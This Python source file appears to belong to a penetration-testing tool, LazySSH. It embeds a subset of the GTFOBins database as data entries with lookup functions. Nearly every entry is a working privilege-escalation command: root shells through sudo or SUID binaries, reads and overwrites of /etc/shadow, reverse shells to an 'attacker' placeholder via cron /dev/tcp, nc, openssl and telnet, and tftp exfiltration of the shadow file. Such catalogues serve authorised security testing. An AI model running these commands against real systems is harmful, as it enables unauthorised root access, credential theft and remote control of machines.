"""Embedded GTFOBins database for LazySSH enumeration cross-referencing.

This module contains a curated subset of the GTFOBins database
(https://gtfobins.github.io/) as Python data structures. No network access
required at runtime. The database covers ~100 commonly exploitable binaries
with SUID, sudo, and capabilities exploitation techniques.

Each entry documents a single exploitation technique for a specific binary
under a specific privilege context (suid, sudo, capabilities, etc.).
"""

from __future__ import annotations

from dataclasses import dataclass


@dataclass(frozen=True)
class GTFOBinsEntry:
    """A single GTFOBins exploitation technique."""

    binary: str
    capability: str  # "suid", "sudo", "capabilities", "file-read", "file-write", "shell"
    command_template: str  # Command with {binary} placeholder where applicable
    description: str


GTFOBINS_DB: tuple[GTFOBinsEntry, ...] = (
    # --- awk / gawk / mawk ---
    GTFOBinsEntry("awk", "sudo", "sudo awk 'BEGIN {{system(\"/bin/sh\")}}'", "Spawn shell via awk"),
    GTFOBinsEntry(
        "awk",
        "suid",
        "./awk 'BEGIN {{system(\"/bin/sh -p\")}}'",
        "SUID shell escape via awk",
    ),
    GTFOBinsEntry(
        "gawk", "sudo", "sudo gawk 'BEGIN {{system(\"/bin/sh\")}}'", "Spawn shell via gawk"
    ),
    GTFOBinsEntry(
        "gawk",
        "suid",
        "./gawk 'BEGIN {{system(\"/bin/sh -p\")}}'",
        "SUID shell escape via gawk",
    ),
    GTFOBinsEntry(
        "mawk", "sudo", "sudo mawk 'BEGIN {{system(\"/bin/sh\")}}'", "Spawn shell via mawk"
    ),
    # --- base64 ---
    GTFOBinsEntry(
        "base64",
        "sudo",
        'LFILE=/etc/shadow; sudo base64 "$LFILE" | base64 -d',
        "Read files via base64",
    ),
    GTFOBinsEntry(
        "base64",
        "suid",
        'LFILE=/etc/shadow; ./base64 "$LFILE" | base64 -d',
        "SUID file read via base64",
    ),
    # --- bash ---
    GTFOBinsEntry("bash", "sudo", "sudo bash", "Spawn root shell via bash"),
    GTFOBinsEntry("bash", "suid", "bash -p", "SUID preserved-privilege shell"),
    # --- busybox ---
    GTFOBinsEntry("busybox", "sudo", "sudo busybox sh", "Spawn shell via busybox"),
    GTFOBinsEntry("busybox", "suid", "./busybox sh -p", "SUID shell via busybox"),
    # --- cat ---
    GTFOBinsEntry(
        "cat",
        "sudo",
        'LFILE=/etc/shadow; sudo cat "$LFILE"',
        "Read files as root via cat",
    ),
    GTFOBinsEntry(
        "cat",
        "suid",
        'LFILE=/etc/shadow; ./cat "$LFILE"',
        "SUID file read via cat",
    ),
    # --- chmod ---
    GTFOBinsEntry(
        "chmod",
        "sudo",
        'LFILE=/etc/shadow; sudo chmod 0777 "$LFILE"',
        "Change file permissions as root",
    ),
    # --- chown ---
    GTFOBinsEntry(
        "chown",
        "sudo",
        'LFILE=/etc/shadow; sudo chown $(id -un):$(id -gn) "$LFILE"',
        "Take file ownership as root",
    ),
    # --- cp ---
    GTFOBinsEntry(
        "cp",
        "sudo",
        'LFILE=/etc/shadow; sudo cp "$LFILE" /tmp/shadow_copy',
        "Copy protected files as root",
    ),
    GTFOBinsEntry(
        "cp",
        "suid",
        'LFILE=/etc/shadow; ./cp "$LFILE" /tmp/shadow_copy',
        "SUID file copy via cp",
    ),
    # --- crontab ---
    GTFOBinsEntry(
        "crontab",
        "sudo",
        "echo \"* * * * * /bin/sh -c 'sh -i >& /dev/tcp/ATTACKER/PORT 0>&1'\" | sudo crontab -",
        "Install cron reverse shell as root",
    ),
    # --- curl ---
    GTFOBinsEntry(
        "curl",
        "sudo",
        'LFILE=/etc/shadow; sudo curl file://"$LFILE"',
        "Read files as root via curl",
    ),
    GTFOBinsEntry(
        "curl",
        "suid",
        'LFILE=/etc/shadow; ./curl file://"$LFILE"',
        "SUID file read via curl",
    ),
    # --- cut ---
    GTFOBinsEntry(
        "cut",
        "sudo",
        "LFILE=/etc/shadow; sudo cut -d '' -f1 \"$LFILE\"",
        "Read files as root via cut",
    ),
    # --- dash ---
    GTFOBinsEntry("dash", "sudo", "sudo dash", "Spawn root shell via dash"),
    GTFOBinsEntry("dash", "suid", "dash -p", "SUID preserved-privilege shell via dash"),
    # --- date ---
    GTFOBinsEntry(
        "date",
        "sudo",
        'LFILE=/etc/shadow; sudo date -f "$LFILE"',
        "Read files as root via date error output",
    ),
    # --- dd ---
    GTFOBinsEntry(
        "dd",
        "sudo",
        'LFILE=/etc/shadow; sudo dd if="$LFILE"',
        "Read files as root via dd",
    ),
    GTFOBinsEntry(
        "dd",
        "suid",
        'LFILE=/etc/shadow; ./dd if="$LFILE"',
        "SUID file read via dd",
    ),
    # --- diff ---
    GTFOBinsEntry(
        "diff",
        "sudo",
        'LFILE=/etc/shadow; sudo diff --line-format=%L /dev/null "$LFILE"',
        "Read files as root via diff",
    ),
    # --- dmesg ---
    GTFOBinsEntry(
        "dmesg",
        "sudo",
        "sudo dmesg -H",
        "Read kernel messages; may spawn pager for shell escape",
    ),
    # --- docker ---
    GTFOBinsEntry(
        "docker",
        "sudo",
        "sudo docker run -v /:/hostfs -it alpine chroot /hostfs /bin/bash",
        "Mount host filesystem via docker for root access",
    ),
    GTFOBinsEntry(
        "docker",
        "suid",
        "docker run -v /:/hostfs -it alpine chroot /hostfs /bin/bash",
        "SUID docker host escape",
    ),
    # --- dpkg ---
    GTFOBinsEntry(
        "dpkg",
        "sudo",
        "sudo dpkg -l; !/bin/sh",
        "Shell escape via dpkg pager",
    ),
    # --- ed ---
    GTFOBinsEntry("ed", "sudo", "sudo ed\n!/bin/sh", "Spawn shell via ed"),
    # --- emacs ---
    GTFOBinsEntry(
        "emacs",
        "sudo",
        "sudo emacs -Q -nw --eval '(term \"/bin/sh\")'",
        "Spawn shell via emacs",
    ),
    GTFOBinsEntry(
        "emacs",
        "suid",
        "./emacs -Q -nw --eval '(term \"/bin/sh -p\")'",
        "SUID shell via emacs",
    ),
    # --- env ---
    GTFOBinsEntry("env", "sudo", "sudo env /bin/sh", "Spawn root shell via env"),
    GTFOBinsEntry("env", "suid", "./env /bin/sh -p", "SUID shell via env"),
    # --- expand ---
    GTFOBinsEntry(
        "expand",
        "sudo",
        'LFILE=/etc/shadow; sudo expand "$LFILE"',
        "Read files as root via expand",
    ),
    # --- expect ---
    GTFOBinsEntry(
        "expect",
        "sudo",
        "sudo expect -c 'spawn /bin/sh; interact'",
        "Spawn shell via expect",
    ),
    GTFOBinsEntry(
        "expect",
        "suid",
        "./expect -c 'spawn /bin/sh -p; interact'",
        "SUID shell via expect",
    ),
    # --- file ---
    GTFOBinsEntry(
        "file",
        "sudo",
        'LFILE=/etc/shadow; sudo file -f "$LFILE"',
        "Read files as root via file error output",
    ),
    # --- find ---
    GTFOBinsEntry(
        "find", "sudo", "sudo find . -exec /bin/sh \\;", "Spawn root shell via find -exec"
    ),
    GTFOBinsEntry(
        "find",
        "suid",
        "./find . -exec /bin/sh -p \\;",
        "SUID shell via find -exec",
    ),
    # --- flock ---
    GTFOBinsEntry("flock", "sudo", "sudo flock -u / /bin/sh", "Spawn root shell via flock"),
    # --- fmt ---
    GTFOBinsEntry(
        "fmt",
        "sudo",
        'LFILE=/etc/shadow; sudo fmt -999 "$LFILE"',
        "Read files as root via fmt",
    ),
    # --- fold ---
    GTFOBinsEntry(
        "fold",
        "sudo",
        'LFILE=/etc/shadow; sudo fold -w99999 "$LFILE"',
        "Read files as root via fold",
    ),
    # --- ftp ---
    GTFOBinsEntry(
        "ftp",
        "sudo",
        "sudo ftp\n!/bin/sh",
        "Shell escape via ftp",
    ),
    # --- gcc ---
    GTFOBinsEntry(
        "gcc",
        "sudo",
        "sudo gcc -wrapper /bin/sh,-s .",
        "Spawn root shell via gcc wrapper",
    ),
    # --- gdb ---
    GTFOBinsEntry(
        "gdb",
        "sudo",
        "sudo gdb -nx -ex '!sh' -ex quit",
        "Spawn root shell via gdb",
    ),
    GTFOBinsEntry(
        "gdb",
        "suid",
        './gdb -nx -ex \'python import os; os.execl("/bin/sh", "sh", "-p")\' -ex quit',
        "SUID shell via gdb python",
    ),
    GTFOBinsEntry(
        "gdb",
        "capabilities",
        "./gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit",
        "Capabilities privilege escalation via gdb",
    ),
    # --- git ---
    GTFOBinsEntry(
        "git",
        "sudo",
        "sudo git -p help config; !/bin/sh",
        "Shell escape via git pager",
    ),
    GTFOBinsEntry(
        "git",
        "sudo",
        "sudo PAGER='sh -c \"exec sh 0<&1\"' git -p diff",
        "Spawn root shell via git PAGER",
    ),
    # --- grep ---
    GTFOBinsEntry(
        "grep",
        "sudo",
        "LFILE=/etc/shadow; sudo grep '' \"$LFILE\"",
        "Read files as root via grep",
    ),
    # --- head ---
    GTFOBinsEntry(
        "head",
        "sudo",
        'LFILE=/etc/shadow; sudo head -c1G "$LFILE"',
        "Read files as root via head",
    ),
    # --- ionice ---
    GTFOBinsEntry("ionice", "sudo", "sudo ionice /bin/sh", "Spawn root shell via ionice"),
    # --- ip ---
    GTFOBinsEntry(
        "ip",
        "sudo",
        "sudo ip netns add foo; sudo ip netns exec foo /bin/sh; sudo ip netns delete foo",
        "Spawn root shell via ip netns",
    ),
    # --- jq ---
    GTFOBinsEntry(
        "jq",
        "sudo",
        'LFILE=/etc/shadow; sudo jq -Rr . "$LFILE"',
        "Read files as root via jq",
    ),
    # --- ksh ---
    GTFOBinsEntry("ksh", "sudo", "sudo ksh", "Spawn root shell via ksh"),
    GTFOBinsEntry("ksh", "suid", "ksh -p", "SUID preserved-privilege shell via ksh"),
    # --- ld.so ---
    GTFOBinsEntry(
        "ld.so",
        "sudo",
        "sudo /lib/ld.so /bin/sh",
        "Spawn root shell via dynamic linker",
    ),
    # --- less ---
    GTFOBinsEntry(
        "less",
        "sudo",
        "sudo less /etc/profile\n!/bin/sh",
        "Shell escape via less pager",
    ),
    GTFOBinsEntry(
        "less",
        "suid",
        "./less /etc/profile\n!/bin/sh -p",
        "SUID shell escape via less",
    ),
    # --- logsave ---
    GTFOBinsEntry(
        "logsave", "sudo", "sudo logsave /dev/null /bin/sh", "Spawn root shell via logsave"
    ),
    # --- ltrace ---
    GTFOBinsEntry(
        "ltrace",
        "sudo",
        "sudo ltrace -b -L /bin/sh",
        "Spawn root shell via ltrace",
    ),
    # --- lua ---
    GTFOBinsEntry(
        "lua",
        "sudo",
        "sudo lua -e 'os.execute(\"/bin/sh\")'",
        "Spawn root shell via lua",
    ),
    GTFOBinsEntry(
        "lua",
        "suid",
        "./lua -e 'os.execute(\"/bin/sh -p\")'",
        "SUID shell via lua",
    ),
    # --- make ---
    GTFOBinsEntry(
        "make",
        "sudo",
        "COMMAND='/bin/sh'; sudo make -s --eval=$'x:\\n\\t-'$COMMAND",
        "Spawn root shell via make",
    ),
    # --- man ---
    GTFOBinsEntry(
        "man",
        "sudo",
        "sudo man man\n!/bin/sh",
        "Shell escape via man pager",
    ),
    # --- more ---
    GTFOBinsEntry(
        "more",
        "sudo",
        "TERM=xterm; sudo more /etc/profile\n!/bin/sh",
        "Shell escape via more pager",
    ),
    GTFOBinsEntry(
        "more",
        "suid",
        "TERM=xterm; ./more /etc/profile\n!/bin/sh -p",
        "SUID shell escape via more",
    ),
    # --- mount ---
    GTFOBinsEntry(
        "mount",
        "sudo",
        "sudo mount -o bind /bin/sh /bin/mount; sudo mount",
        "Shell via mount bind",
    ),
    # --- mv ---
    GTFOBinsEntry(
        "mv",
        "sudo",
        'LFILE=/etc/shadow; TF=$(mktemp); sudo mv "$LFILE" "$TF"',
        "Move protected files as root",
    ),
    # --- mysql ---
    GTFOBinsEntry(
        "mysql",
        "sudo",
        "sudo mysql -e '\\! /bin/sh'",
        "Shell escape via mysql",
    ),
    # --- nano ---
    GTFOBinsEntry(
        "nano",
        "sudo",
        "sudo nano\n^R^X\nreset; sh 1>&0 2>&0",
        "Shell escape via nano",
    ),
    GTFOBinsEntry(
        "nano",
        "suid",
        "./nano\n^R^X\nreset; sh -p 1>&0 2>&0",
        "SUID shell escape via nano",
    ),
    # --- nasm ---
    GTFOBinsEntry(
        "nasm",
        "sudo",
        'LFILE=/etc/shadow; sudo nasm -o /dev/stdout "$LFILE"',
        "Read files as root via nasm",
    ),
    # --- nc / netcat ---
    GTFOBinsEntry(
        "nc",
        "sudo",
        "RHOST=attacker; RPORT=12345; sudo nc -e /bin/sh $RHOST $RPORT",
        "Reverse shell via nc as root",
    ),
    # --- nice ---
    GTFOBinsEntry("nice", "sudo", "sudo nice /bin/sh", "Spawn root shell via nice"),
    # --- nl ---
    GTFOBinsEntry(
        "nl",
        "sudo",
        'LFILE=/etc/shadow; sudo nl -ba "$LFILE"',
        "Read files as root via nl",
    ),
    # --- nmap ---
    GTFOBinsEntry(
        "nmap",
        "sudo",
        "TF=$(mktemp); echo 'os.execute(\"/bin/sh\")' > $TF; sudo nmap --script=$TF",
        "Spawn root shell via nmap script",
    ),
    GTFOBinsEntry(
        "nmap",
        "suid",
        "TF=$(mktemp); echo 'os.execute(\"/bin/sh -p\")' > $TF; ./nmap --script=$TF",
        "SUID shell via nmap script",
    ),
    # --- node ---
    GTFOBinsEntry(
        "node",
        "sudo",
        'sudo node -e \'require("child_process").spawn("/bin/sh", {{stdio: [0, 1, 2]}})\'',
        "Spawn root shell via node",
    ),
    GTFOBinsEntry(
        "node",
        "suid",
        './node -e \'require("child_process").spawn("/bin/sh", ["-p"], {{stdio: [0, 1, 2]}})\'',
        "SUID shell via node",
    ),
    # --- od ---
    GTFOBinsEntry(
        "od",
        "sudo",
        'LFILE=/etc/shadow; sudo od -An -c "$LFILE"',
        "Read files as root via od",
    ),
    # --- openssl ---
    GTFOBinsEntry(
        "openssl",
        "sudo",
        "RHOST=attacker; RPORT=12345; mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | sudo openssl s_client -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s",
        "Reverse shell via openssl as root",
    ),
    GTFOBinsEntry(
        "openssl",
        "file-read",
        'LFILE=/etc/shadow; openssl enc -in "$LFILE"',
        "Read arbitrary files via openssl",
    ),
    # --- perl ---
    GTFOBinsEntry(
        "perl",
        "sudo",
        "sudo perl -e 'exec \"/bin/sh\"'",
        "Spawn root shell via perl",
    ),
    GTFOBinsEntry(
        "perl",
        "suid",
        "./perl -e 'exec \"/bin/sh -p\"'",
        "SUID shell via perl",
    ),
    GTFOBinsEntry(
        "perl",
        "capabilities",
        "./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\"'",
        "Capabilities escalation via perl",
    ),
    # --- pg ---
    GTFOBinsEntry(
        "pg",
        "sudo",
        "sudo pg /etc/profile\n!/bin/sh",
        "Shell escape via pg pager",
    ),
    # --- php ---
    GTFOBinsEntry(
        "php",
        "sudo",
        'CMD="/bin/sh"; sudo php -r "system(\'$CMD\');"',
        "Spawn root shell via php",
    ),
    GTFOBinsEntry(
        "php",
        "suid",
        "./php -r \"pcntl_exec('/bin/sh', ['-p']);\"",
        "SUID shell via php",
    ),
    # --- pic ---
    GTFOBinsEntry(
        "pic",
        "sudo",
        "sudo pic -U\n.PS\nsh X sh X",
        "Shell escape via pic",
    ),
    # --- pico ---
    GTFOBinsEntry(
        "pico",
        "sudo",
        "sudo pico\n^R^X\nreset; sh 1>&0 2>&0",
        "Shell escape via pico",
    ),
    # --- pip ---
    GTFOBinsEntry(
        "pip",
        "sudo",
        'TF=$(mktemp -d); echo \'import os; os.execl("/bin/sh", "sh")\' > $TF/setup.py; sudo pip install $TF',
        "Spawn root shell via pip install",
    ),
    GTFOBinsEntry(
        "pip3",
        "sudo",
        'TF=$(mktemp -d); echo \'import os; os.execl("/bin/sh", "sh")\' > $TF/setup.py; sudo pip3 install $TF',
        "Spawn root shell via pip3 install",
    ),
    # --- pkexec ---
    GTFOBinsEntry(
        "pkexec",
        "sudo",
        "sudo pkexec /bin/sh",
        "Spawn root shell via pkexec",
    ),
    GTFOBinsEntry(
        "pkexec",
        "suid",
        "pkexec /bin/sh",
        "SUID shell via pkexec (CVE-2021-4034 if unpatched)",
    ),
    # --- python / python3 ---
    GTFOBinsEntry(
        "python",
        "sudo",
        "sudo python -c 'import os; os.system(\"/bin/sh\")'",
        "Spawn root shell via python",
    ),
    GTFOBinsEntry(
        "python",
        "suid",
        './python -c \'import os; os.execl("/bin/sh", "sh", "-p")\'',
        "SUID shell via python",
    ),
    GTFOBinsEntry(
        "python",
        "capabilities",
        "./python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
        "Capabilities escalation via python",
    ),
    GTFOBinsEntry(
        "python3",
        "sudo",
        "sudo python3 -c 'import os; os.system(\"/bin/sh\")'",
        "Spawn root shell via python3",
    ),
    GTFOBinsEntry(
        "python3",
        "suid",
        './python3 -c \'import os; os.execl("/bin/sh", "sh", "-p")\'',
        "SUID shell via python3",
    ),
    GTFOBinsEntry(
        "python3",
        "capabilities",
        "./python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
        "Capabilities escalation via python3",
    ),
    # --- readelf ---
    GTFOBinsEntry(
        "readelf",
        "sudo",
        'LFILE=/etc/shadow; sudo readelf -a @"$LFILE"',
        "Read files as root via readelf",
    ),
    # --- rev ---
    GTFOBinsEntry(
        "rev",
        "sudo",
        'LFILE=/etc/shadow; sudo rev "$LFILE" | rev',
        "Read files as root via rev",
    ),
    # --- rlwrap ---
    GTFOBinsEntry(
        "rlwrap",
        "sudo",
        "sudo rlwrap /bin/sh",
        "Spawn root shell via rlwrap",
    ),
    # --- rsync ---
    GTFOBinsEntry(
        "rsync",
        "sudo",
        "sudo rsync -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null",
        "Spawn root shell via rsync",
    ),
    # --- ruby ---
    GTFOBinsEntry(
        "ruby",
        "sudo",
        "sudo ruby -e 'exec \"/bin/sh\"'",
        "Spawn root shell via ruby",
    ),
    GTFOBinsEntry(
        "ruby",
        "suid",
        "./ruby -e 'exec \"/bin/sh -p\"'",
        "SUID shell via ruby",
    ),
    # --- run-parts ---
    GTFOBinsEntry(
        "run-parts",
        "sudo",
        "sudo run-parts --new-session --regex '.*sh' /bin",
        "Spawn root shell via run-parts",
    ),
    # --- rvim ---
    GTFOBinsEntry(
        "rvim",
        "sudo",
        'sudo rvim -c \':py3 import os; os.execl("/bin/sh", "sh")\'',
        "Spawn root shell via rvim python",
    ),
    # --- scp ---
    GTFOBinsEntry(
        "scp",
        "sudo",
        "TF=$(mktemp); echo 'sh 0<&2 1>&2' > $TF; chmod +x $TF; sudo scp -S $TF x y:",
        "Spawn root shell via scp",
    ),
    # --- screen ---
    GTFOBinsEntry(
        "screen",
        "sudo",
        "sudo screen",
        "Spawn root shell via screen",
    ),
    GTFOBinsEntry(
        "screen",
        "suid",
        "./screen -D -m -L ld.so.preload echo -ne '\\x0a/tmp/libhax.so'",
        "SUID privilege escalation via screen",
    ),
    # --- sed ---
    GTFOBinsEntry(
        "sed",
        "sudo",
        "sudo sed -n '1e exec sh 1>&0' /etc/hosts",
        "Spawn root shell via sed",
    ),
    GTFOBinsEntry(
        "sed",
        "suid",
        "./sed -n '1e exec sh -p 1>&0' /etc/hosts",
        "SUID shell via sed",
    ),
    # --- setarch ---
    GTFOBinsEntry(
        "setarch",
        "sudo",
        "sudo setarch $(arch) /bin/sh",
        "Spawn root shell via setarch",
    ),
    # --- shuf ---
    GTFOBinsEntry(
        "shuf",
        "sudo",
        'LFILE=/etc/shadow; sudo shuf -e -z "$LFILE"',
        "Read files as root via shuf",
    ),
    # --- socat ---
    GTFOBinsEntry(
        "socat",
        "sudo",
        "sudo socat stdin exec:/bin/sh",
        "Spawn root shell via socat",
    ),
    GTFOBinsEntry(
        "socat",
        "suid",
        "./socat stdin exec:/bin/sh,pty,stderr,setsid,sigint,sane",
        "SUID shell via socat",
    ),
    # --- sort ---
    GTFOBinsEntry(
        "sort",
        "sudo",
        'LFILE=/etc/shadow; sudo sort -m "$LFILE"',
        "Read files as root via sort",
    ),
    # --- sqlite3 ---
    GTFOBinsEntry(
        "sqlite3",
        "sudo",
        "sudo sqlite3 /dev/null '.shell /bin/sh'",
        "Spawn root shell via sqlite3",
    ),
    # --- ssh ---
    GTFOBinsEntry(
        "ssh",
        "sudo",
        "sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x",
        "Spawn root shell via ssh ProxyCommand",
    ),
    # --- stdbuf ---
    GTFOBinsEntry(
        "stdbuf",
        "sudo",
        "sudo stdbuf -i0 /bin/sh",
        "Spawn root shell via stdbuf",
    ),
    # --- strace ---
    GTFOBinsEntry(
        "strace",
        "sudo",
        "sudo strace -o /dev/null /bin/sh",
        "Spawn root shell via strace",
    ),
    GTFOBinsEntry(
        "strace",
        "suid",
        "./strace -o /dev/null /bin/sh -p",
        "SUID shell via strace",
    ),
    # --- strings ---
    GTFOBinsEntry(
        "strings",
        "sudo",
        'LFILE=/etc/shadow; sudo strings "$LFILE"',
        "Read files as root via strings",
    ),
    # --- su ---
    GTFOBinsEntry(
        "su",
        "sudo",
        "sudo su -",
        "Switch to root via su",
    ),
    # --- tail ---
    GTFOBinsEntry(
        "tail",
        "sudo",
        'LFILE=/etc/shadow; sudo tail -c1G "$LFILE"',
        "Read files as root via tail",
    ),
    # --- tar ---
    GTFOBinsEntry(
        "tar",
        "sudo",
        "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
        "Spawn root shell via tar checkpoint",
    ),
    GTFOBinsEntry(
        "tar",
        "suid",
        "./tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
        "SUID shell via tar checkpoint",
    ),
    # --- taskset ---
    GTFOBinsEntry(
        "taskset",
        "sudo",
        "sudo taskset 1 /bin/sh",
        "Spawn root shell via taskset",
    ),
    # --- tee ---
    GTFOBinsEntry(
        "tee",
        "sudo",
        "echo 'DATA' | sudo tee /etc/shadow",
        "Write to protected files via tee",
    ),
    GTFOBinsEntry(
        "tee",
        "suid",
        "echo 'DATA' | ./tee /etc/shadow",
        "SUID file write via tee",
    ),
    # --- telnet ---
    GTFOBinsEntry(
        "telnet",
        "sudo",
        "RHOST=attacker; RPORT=12345; sudo telnet $RHOST $RPORT\n^]\n!/bin/sh",
        "Shell escape via telnet",
    ),
    # --- tftp ---
    GTFOBinsEntry(
        "tftp",
        "sudo",
        "RHOST=attacker; sudo tftp $RHOST\nput /etc/shadow",
        "Exfiltrate files via tftp as root",
    ),
    # --- time ---
    GTFOBinsEntry(
        "time",
        "sudo",
        "sudo /usr/bin/time /bin/sh",
        "Spawn root shell via time",
    ),
    # --- timeout ---
    GTFOBinsEntry(
        "timeout",
        "sudo",
        "sudo timeout --foreground 9999 /bin/sh",
        "Spawn root shell via timeout",
    ),
    # --- tmux ---
    GTFOBinsEntry(
        "tmux",
        "sudo",
        "sudo tmux",
        "Spawn root shell via tmux",
    ),
    # --- top ---
    GTFOBinsEntry(
        "top",
        "sudo",
        "echo -e 'n\\n:!sh\\n' | sudo top",
        "Shell escape via top",
    ),
    # --- ul ---
    GTFOBinsEntry(
        "ul",
        "sudo",
        'LFILE=/etc/shadow; sudo ul "$LFILE"',
        "Read files as root via ul",
    ),
    # --- uniq ---
    GTFOBinsEntry(
        "uniq",
        "sudo",
        'LFILE=/etc/shadow; sudo uniq "$LFILE"',
        "Read files as root via uniq",
    ),
    # --- unshare ---
    GTFOBinsEntry(
        "unshare",
        "sudo",
        "sudo unshare /bin/sh",
        "Spawn root shell via unshare",
    ),
    # --- vi ---
    GTFOBinsEntry(
        "vi",
        "sudo",
        "sudo vi -c ':!/bin/sh'",
        "Spawn root shell via vi",
    ),
    GTFOBinsEntry(
        "vi",
        "suid",
        './vi -c \':py3 import os; os.execl("/bin/sh", "sh", "-p")\'',
        "SUID shell via vi python",
    ),
    # --- vim ---
    GTFOBinsEntry(
        "vim",
        "sudo",
        "sudo vim -c ':!/bin/sh'",
        "Spawn root shell via vim",
    ),
    GTFOBinsEntry(
        "vim",
        "suid",
        './vim -c \':py3 import os; os.execl("/bin/sh", "sh", "-p")\'',
        "SUID shell via vim python",
    ),
    # --- watch ---
    GTFOBinsEntry(
        "watch",
        "sudo",
        "sudo watch -x sh -c 'reset 1>&2 && sh 1>&2'",
        "Spawn root shell via watch",
    ),
    GTFOBinsEntry(
        "watch",
        "suid",
        "./watch -x sh -c 'reset 1>&2 && sh -p 1>&2'",
        "SUID shell via watch",
    ),
    # --- wget ---
    GTFOBinsEntry(
        "wget",
        "sudo",
        "TF=$(mktemp); chmod +x $TF; echo -e '#!/bin/sh\\n/bin/sh' > $TF; sudo wget --use-askpass=$TF 0",
        "Spawn root shell via wget askpass",
    ),
    GTFOBinsEntry(
        "wget",
        "sudo",
        'LFILE=/etc/shadow; sudo wget -i "$LFILE"',
        "Read files as root via wget error output",
    ),
    # --- wish ---
    GTFOBinsEntry(
        "wish",
        "sudo",
        "sudo wish\nexec /bin/sh <@stdin >@stdout 2>@stderr",
        "Spawn root shell via wish/Tcl",
    ),
    # --- xargs ---
    GTFOBinsEntry(
        "xargs",
        "sudo",
        "sudo xargs -a /dev/null sh",
        "Spawn root shell via xargs",
    ),
    # --- xxd ---
    GTFOBinsEntry(
        "xxd",
        "sudo",
        'LFILE=/etc/shadow; sudo xxd "$LFILE" | xxd -r',
        "Read files as root via xxd",
    ),
    GTFOBinsEntry(
        "xxd",
        "suid",
        'LFILE=/etc/shadow; ./xxd "$LFILE" | xxd -r',
        "SUID file read via xxd",
    ),
    # --- zip ---
    GTFOBinsEntry(
        "zip",
        "sudo",
        "TF=$(mktemp -u); sudo zip $TF /etc/hosts -T -TT 'sh #'",
        "Spawn root shell via zip",
    ),
    GTFOBinsEntry(
        "zip",
        "suid",
        "TF=$(mktemp -u); ./zip $TF /etc/hosts -T -TT 'sh -p #'",
        "SUID shell via zip",
    ),
    # --- zsh ---
    GTFOBinsEntry("zsh", "sudo", "sudo zsh", "Spawn root shell via zsh"),
    GTFOBinsEntry("zsh", "suid", "zsh -p", "SUID preserved-privilege shell via zsh"),
    # --- sh ---
    GTFOBinsEntry("sh", "sudo", "sudo sh", "Spawn root shell via sh"),
    GTFOBinsEntry("sh", "suid", "sh -p", "SUID preserved-privilege shell via sh"),
)

# Pre-built indexes for O(1) lookup by (binary, capability)
_SUID_INDEX: dict[str, list[GTFOBinsEntry]] = {}
_SUDO_INDEX: dict[str, list[GTFOBinsEntry]] = {}
_CAPABILITIES_INDEX: dict[str, list[GTFOBinsEntry]] = {}

for _entry in GTFOBINS_DB:
    if _entry.capability == "suid":
        _SUID_INDEX.setdefault(_entry.binary, []).append(_entry)
    elif _entry.capability == "sudo":
        _SUDO_INDEX.setdefault(_entry.binary, []).append(_entry)
    elif _entry.capability == "capabilities":
        _CAPABILITIES_INDEX.setdefault(_entry.binary, []).append(_entry)


def lookup_suid(binary_name: str) -> list[GTFOBinsEntry]:
    """Return all SUID exploitation techniques for a given binary name."""
    return list(_SUID_INDEX.get(binary_name, []))


def lookup_sudo(binary_name: str) -> list[GTFOBinsEntry]:
    """Return all sudo exploitation techniques for a given binary name."""
    return list(_SUDO_INDEX.get(binary_name, []))


def lookup_capabilities(binary_name: str) -> list[GTFOBinsEntry]:
    """Return all capabilities exploitation techniques for a given binary name."""
    return list(_CAPABILITIES_INDEX.get(binary_name, []))
